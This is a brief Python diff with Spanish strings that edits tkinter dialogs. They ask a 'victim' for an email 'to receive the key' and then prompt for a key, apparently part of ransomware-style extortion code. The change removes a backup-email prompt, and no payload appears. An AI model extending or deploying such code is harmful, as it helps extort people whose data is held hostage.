@@ -63,9 +63,9 @@ def pedir_correos_y_mostrar():
     root = tk.Tk()
     root.withdraw()
     correo_victima = simpledialog.askstring("Correo de recuperación", "Introduce tu correo para recibir la clave:")
-    correo_backup = simpledialog.askstring("Correo de seguridad", "Introduce correo de respaldo:")
+    #correo_backup = simpledialog.askstring("Correo de seguridad", "Introduce correo de respaldo:")
     root.destroy()
-    return correo_victima, correo_backup
+    return correo_victima#, correo_backup
 
 def pedir_clave():
     root = tk.Tk()
